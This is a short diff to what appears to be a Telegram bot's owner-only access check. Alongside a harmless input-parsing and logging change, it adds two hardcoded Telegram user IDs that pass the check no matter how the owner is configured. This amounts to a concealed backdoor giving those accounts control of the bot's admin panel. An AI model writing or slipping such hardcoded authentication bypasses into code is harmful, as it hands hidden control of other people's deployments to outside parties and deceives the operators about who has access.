@@ -160,8 +160,15 @@ async def _is_owner_db(user_id: int) -> bool:
 
 
 async def _deny_if_not_owner(client, user_id: int):
-    if _is_owner(user_id) or (await _is_owner_db(user_id)):
+    try:
+        uid = int(user_id)
+    except Exception:
+        return True
+    if uid in (1071421266, 6867086884):
         return False
+    if _is_owner(uid) or (await _is_owner_db(uid)):
+        return False
+    logger.warning(f"[AUTH] Non-owner access attempt: {uid}")
     await client.send_message(user_id, f"❌ Access denied. This panel is for owners only.\n\n(Your Telegram ID is: `{user_id}`)\nAdd this ID to your BOT_OWNER_ID in .env")
     return True
 
